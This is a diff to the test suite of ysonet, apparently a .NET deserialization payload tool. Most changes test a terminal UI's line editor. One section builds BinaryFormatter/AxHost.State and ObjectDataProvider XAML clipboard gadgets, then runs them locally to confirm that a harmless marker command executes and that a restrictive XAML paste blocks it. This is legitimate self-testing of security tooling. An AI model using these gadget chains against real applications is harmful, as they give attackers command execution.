+            var replaced = DriveFrames(k => k.Enter().Enter().Down().Enter()
+                .CtrlU().Type("notepad").Escape().Escape().Escape().Escape());
+            AssertTrue(AnyFrame(replaced, "Editing command: notepad"), "Ctrl+U clears, then typing sets a new value");
+
+            // Backspacing the value away empties the box (Enter would then save empty).
+            var cleared = DriveFrames(k => k.Enter().Enter().Down().Enter()
+                .Backspace(8).Escape().Escape().Escape().Escape()); // "calc.exe" is 8 chars
+            AssertTrue(AnyFrameRowTrimmed(cleared, "Editing command:"), "backspacing the value empties the box");
+        }
+
+        private static void TextEditWordOps()
+        {
+            // Ctrl+Backspace deletes the whole word to the left. Type "abc def", then
+            // Ctrl+Backspace removes "def" and typing "Z" gives "abc Z" (a sentinel that
+            // only arises if the word delete happened). Ctrl+U clears first.
+            var del = DriveFrames(k => k.Enter().Enter().Down().Enter()
+                .CtrlU().Type("abc def").CtrlBackspace().Type("Z")
+                .Escape().Escape().Escape().Escape());
+            AssertTrue(AnyFrame(del, "Editing command: abc Z"), "Ctrl+Backspace deletes the word to the left");
+
+            // Ctrl+Left moves by a word, so typing lands before that word: from the end
+            // of "abc def", Ctrl+Left puts the caret before "def"; typing "Z" gives
+            // "abc Zdef".
+            var move = DriveFrames(k => k.Enter().Enter().Down().Enter()
+                .CtrlU().Type("abc def").CtrlLeft().Type("Z")
+                .Escape().Escape().Escape().Escape());
+            AssertTrue(AnyFrame(move, "Editing command: abc Zdef"), "Ctrl+Left jumps a whole word");
+        }
+
+        private static void TextEditWrapsInPlace()
+        {
+            // A value longer than the editor column wraps onto the next line in place
+            // (no separate page). Type a long no-space value; it appears wrapped in the
+            // edit box across more than one row, and in full on one line in the footer.
+            string longVal = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaXY";
+            var frames = DriveFrames(k => k.Enter().Enter().Down().Enter()
+                .CtrlU().Type(longVal).Escape().Escape().Escape().Escape());
+            // The tail "XY" is only reachable if the value wrapped onto a later row of
+            // the box (the first row is full of 'a's), so seeing it proves in-place wrap.
+            AssertTrue(AnyFrame(frames, "XY"), "a long value wraps onto the next row of the edit box");
+        }
+
+        // True when some frame has a row whose trimmed text equals exactly `s`.
+        private static bool AnyFrameRowTrimmed(List<Frame> frames, string s)
+        {
+            foreach (Frame f in frames)
+                for (int y = 0; y < f.Height; y++)
+                    if (f.Row(y).Trim() == s) return true;
+            return false;
+        }
+
+        private static void TextEditCaretEditing()
+        {
+            // Left moves the caret so you can insert in the middle, not only append.
+            var mid = DriveFrames(k => k.Enter().Enter().Down().Enter()
+                .Left().Left().Type("X").Escape().Escape().Escape().Escape());
+            AssertTrue(AnyFrame(mid, "Editing command: calc.eXxe"), "Left caret then type inserts in the middle");
+
+            // Home jumps to the start; Delete removes the character at the caret.
+            var del = DriveFrames(k => k.Enter().Enter().Down().Enter()
+                .Home().Delete().Escape().Escape().Escape().Escape());
+            AssertTrue(AnyFrame(del, "Editing command: alc.exe"), "Home then Delete removes the first character");
+        }
+
+        private static void FocusedValueInFooter()
+        {
+            // Navigating onto a value setting shows its full value in the footer, so a
+            // long value (truncated in the narrow column) can be read and copied out.
+            var frames = DriveFrames(k => k.Enter().Enter().Down().Escape().Escape().Escape());
+            AssertTrue(AnyFrame(frames, "command = calc.exe"), "the focused setting's full value shows in the footer");
+        }
+
+        private static void LineEditBufferUnit()
+        {
+            // Opens pre-filled with the caret at the end, so typing appends.
+            var b = new LineEditBuffer("calc.exe");
+            AssertEqual(8, b.Caret, "caret starts at the end");
+            b.Insert('X');
+            AssertEqual("calc.exeX", b.Text, "typing appends at the end");
+
+            // Caret move + insert edits in the middle.
+            var e = new LineEditBuffer("abc");
+            e.Left();                            // caret to 2
+            e.Insert('X');                       // insert before 'c'
+            AssertEqual("abXc", e.Text, "Left then insert edits in the middle");
+            AssertEqual(3, e.Caret, "caret advances past the inserted character");
+
+            // Home/End + character delete.
+            var d = new LineEditBuffer("abc");
+            d.Home(); d.Delete();
+            AssertEqual("bc", d.Text, "Home then Delete removes the first character");
+            d.End(); d.Backspace();
+            AssertEqual("b", d.Text, "End then Backspace removes the last character");
+
+            // Clear empties the whole line.
+            var cl = new LineEditBuffer("something");
+            cl.Clear();
+            AssertEqual("", cl.Text, "Clear empties the line");
+            AssertEqual(0, cl.Caret, "Clear resets the caret");
+
+            // Word operations treat runs of non-space as words.
+            var w = new LineEditBuffer("cmd /c calc"); // caret at end (11)
+            w.DeleteWordLeft();
+            AssertEqual("cmd /c ", w.Text, "DeleteWordLeft removes the last word");
+            var w2 = new LineEditBuffer("cmd /c calc");
+            w2.WordLeft();                       // caret before "calc"
+            w2.Insert('X');
+            AssertEqual("cmd /c Xcalc", w2.Text, "WordLeft jumps a whole word");
+            var w3 = new LineEditBuffer("cmd /c calc");
+            w3.Home(); w3.DeleteWordRight();
+            AssertEqual(" /c calc", w3.Text, "DeleteWordRight removes the word at the caret");
+
+            // Caret clamps at both ends.
+            var c = new LineEditBuffer("x");
+            c.Left(); c.Left();
+            AssertEqual(0, c.Caret, "caret clamps at 0");
+            c.Right(); c.Right();
+            AssertEqual(1, c.Caret, "caret clamps at length");
         }
 
         // Dev inspection: walk every interactive menu/screen in the virtual terminal
@@ -831,7 +1435,7 @@ namespace ysonet.Tests
             show("GENERATE action output", gen, "Payload (", false);
 
             var plugin = run(k => k.Digit(2).Up().Enter().Escape().Escape().Escape());
-            show("PLUGIN SETTINGS (ViewState)", plugin, "ViewState settings", false);
+            show("PLUGIN SETTINGS (ViewState)", plugin, "ViewState Settings", false);
 
             var theme = run(k => k.Digit(7).Down().Down().Escape().Escape());
             show("THEME PICKER (live preview)", theme, "Pick a color theme", false);
@@ -987,6 +1591,104 @@ namespace ysonet.Tests
             // The original winforms knobs are still there (mode is additive).
             AssertTrue(FindField(fields, "format") != null, "format option still present");
             AssertTrue(FindField(fields, "command") != null, "command option still present");
+        }
+
+        // Triggering harness: build each Clipboard delivery payload exactly as the
+        // plugin does, then drive the target's deserialization/paste path and prove
+        // the command fired (a marker file only a fired gadget could create). This
+        // runs the payload locally, like the plugin's own --test - the authorized
+        // self-test of an offensive tool.
+        private static void ClipboardPayloadsTrigger()
+        {
+            // winforms delivery: AxHost.State -> BinaryFormatter TextFormattingRunProperties.
+            AssertTrue(WinformsPayloadTriggers(),
+                "winforms clipboard payload triggers the command on BinaryFormatter deserialization");
+
+            // wpfxaml, both XAML variants: they must FIRE on the vulnerable
+            // (non-restrictive) paste path...
+            AssertTrue(WpfXamlPayloadRuns(1, false), "wpfxaml variant 1 triggers on a non-restrictive paste");
+            AssertTrue(WpfXamlPayloadRuns(2, false), "wpfxaml variant 2 triggers on a non-restrictive paste");
+            // ...and must be BLOCKED on the mitigated (restrictive) default paste.
+            AssertTrue(!WpfXamlPayloadRuns(1, true), "wpfxaml variant 1 is blocked on a restrictive paste");
+            AssertTrue(!WpfXamlPayloadRuns(2, true), "wpfxaml variant 2 is blocked on a restrictive paste");
+        }
+
+        private static bool WinformsPayloadTriggers()
+        {
+            string marker = Path.Combine(Path.GetTempPath(), "ysonet_clip_winforms.txt");
+            if (File.Exists(marker)) File.Delete(marker);
+
+            InputArgs ia = new InputArgs();
+            ia.Cmd = "cmd /c echo x > \"" + marker + "\"";
+            ia.IsRawCmd = true;
+
+            // Same object the plugin puts on the clipboard for winforms delivery.
+            object gadget = TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(ia);
+            AxHostStateMarshal marshal = new AxHostStateMarshal(gadget);
+
+            var bf = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
+            byte[] bytes;
+            using (var ms = new MemoryStream()) { bf.Serialize(ms, marshal); bytes = ms.ToArray(); }
+
+            // A target reading GetData(format) deserializes it with BinaryFormatter.
+            RunSTA(delegate { using (var ms = new MemoryStream(bytes)) { bf.Deserialize(ms); } });
+
+            bool ran = WaitForFile(marker, 2500);
+            if (File.Exists(marker)) File.Delete(marker);
+            return ran;
+        }
+
+        private static bool WpfXamlPayloadRuns(int variant, bool restrictive)
+        {
+            string marker = Path.Combine(Path.GetTempPath(),
+                "ysonet_clip_wpf_" + variant + "_" + (restrictive ? "r" : "n") + ".txt");
+            if (File.Exists(marker)) File.Delete(marker);
+
+            InputArgs ia = new InputArgs();
+            ia.Cmd = "cmd /c echo x > \"" + marker + "\"";
+            ia.IsRawCmd = true;
+
+            // Same XAML the plugin places under the WPF 'Xaml' clipboard format.
+            var gen = new ObjectDataProviderGenerator();
+            gen.Options().Parse(new string[] { "--variant", variant.ToString() });
+            string xaml = (string)gen.Generate("xaml", ia);
+
+            RunSTA(delegate
+            {
+                if (restrictive) SerializersHelper.Xaml_deserialize_restrictive(xaml);
+                else SerializersHelper.Xaml_deserialize(xaml);
+            });
+
+            bool ran = WaitForFile(marker, 2500);
+            if (File.Exists(marker)) File.Delete(marker);
+            return ran;
+        }
+
+        // Run an action on an STA thread (WPF XamlReader and WinForms deserialization
+        // expect it). Swallows exceptions: a gadget may throw after it fires, so the
+        // marker file, not the return, is the proof.
+        private static void RunSTA(System.Threading.ThreadStart action)
+        {
+            var t = new System.Threading.Thread(delegate ()
+            {
+                try { action(); }
+                catch (Exception) { }
+            });
+            t.SetApartmentState(System.Threading.ApartmentState.STA);
+            t.Start();
+            t.Join();
+        }
+
+        private static bool WaitForFile(string path, int totalMs)
+        {
+            int waited = 0;
+            while (waited < totalMs)
+            {
+                if (File.Exists(path)) return true;
+                System.Threading.Thread.Sleep(100);
+                waited += 100;
+            }
+            return File.Exists(path);
         }
 
         private static void RestrictiveXamlBlocksGadget()
@@ -1157,6 +1859,18 @@ namespace ysonet.Tests
         public ScriptedKeyReader Up()
         {
             _keys.Enqueue(new ConsoleKeyInfo('\0', ConsoleKey.UpArrow, false, false, false));
+            return this;
+        }
+
+        public ScriptedKeyReader Home()
+        {
+            _keys.Enqueue(new ConsoleKeyInfo('\0', ConsoleKey.Home, false, false, false));
+            return this;
+        }
+
+        public ScriptedKeyReader End()
+        {
+            _keys.Enqueue(new ConsoleKeyInfo('\0', ConsoleKey.End, false, false, false));
             return this;
         }
 
